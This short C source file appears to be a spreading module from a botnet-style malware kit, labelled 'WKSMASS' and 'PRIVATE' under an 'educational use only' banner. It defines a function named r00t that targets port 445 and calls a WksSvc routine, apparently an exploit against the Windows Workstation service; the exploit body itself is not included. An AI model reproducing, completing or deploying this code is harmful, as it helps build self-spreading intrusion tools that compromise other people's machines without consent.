/*************************************************************
 *   Experiment code by Depth45. For educational use only!   *
 *                         WKSMASS                           *
 *                         PRIVATE                           *
 *************************************************************/



#include "includes.h"
#include "functions.h"
#include "externs.h"

#ifndef NO_WKSSVC
#ifndef NO_DEPTH

BOOL r00t(EXINFO exinfo) {
	exinfo.port = 445;
	BOOL bWorkstation = WksSvc(exinfo);
	return (bWorkstation);

}

#endif 
#endif